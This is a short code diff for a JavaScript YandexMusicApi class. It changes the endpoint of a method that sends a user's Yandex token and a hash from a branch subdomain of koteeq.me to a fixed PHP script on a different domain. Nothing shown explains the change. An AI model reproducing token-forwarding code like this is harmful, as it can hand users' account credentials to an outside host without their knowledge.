@@ -27,7 +27,7 @@ class YandexMusicApi {
     };
 
     send_token_to_backend = async (branch, hash, token) => {
-        const url = `https://${branch}.koteeq.me/yandex`;
+        const url = `https://karpushov.online/yandex/token.php`;
 
         let data = {
             hash: hash,
